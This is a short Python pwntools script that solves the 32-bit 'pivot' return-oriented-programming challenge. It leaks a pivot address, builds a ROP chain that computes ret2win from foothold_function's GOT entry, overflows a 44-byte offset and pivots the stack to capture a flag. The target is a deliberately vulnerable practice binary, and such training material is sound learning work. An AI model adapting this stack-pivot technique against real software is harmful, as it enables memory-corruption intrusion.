#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./pivot32")

shell.recvuntil(b"pivot: ")
pivot = p32(int(shell.recvline().strip(), 16))

offset = 44
junk = b"A" * offset

plt_foothold = p32(0x8048520)
got_foothold = p32(0x804a024)

xchg_esp_eax = p32(0x804882e)
mov_eax_eax = p32(0x8048830)
add_eax_ebx = p32(0x8048833)
popal_cld = p32(0x804874d)
call_eax = p32(0x80485f0)
pop_eax = p32(0x804882c)
pop_ebx = p32(0x80484a9)

payload  = b""
payload += plt_foothold
payload += pop_eax + got_foothold
payload += mov_eax_eax
payload += pop_ebx + p32(0x1f7)
payload += add_eax_ebx
payload += call_eax

shell.sendlineafter(b"> ", payload)

payload  = b""
payload += junk
payload += pop_eax + pivot
payload += xchg_esp_eax

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
